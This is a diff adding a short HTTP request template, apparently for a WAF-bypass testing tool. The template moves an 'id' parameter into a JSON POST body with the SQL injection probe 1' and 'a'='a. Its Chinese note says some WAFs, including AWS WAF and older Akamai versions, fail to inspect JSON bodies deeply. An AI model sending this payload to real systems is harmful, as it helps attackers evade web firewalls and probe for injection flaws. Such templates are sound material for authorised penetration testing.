@@ -1,0 +1,16 @@
+# @name: JSON Body 传参
+# @tags: post,json,sqli,aws,akamai,id,bypass
+# @color: purple
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: get_param_to_json
+# @intent.param: id
+# @intent.payload: {"id":"1' and 'a'='a"}
+# @intent.content_type: application/json
+# @note: 将参数改为 application/json 的 JSON Body，部分 WAF(AWS WAF、Akamai 历史版本)对 JSON 解析不全或默认不深度解析，绕过基于表单的规则。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: application/json
+
+{"id":"1' and 'a'='a"}
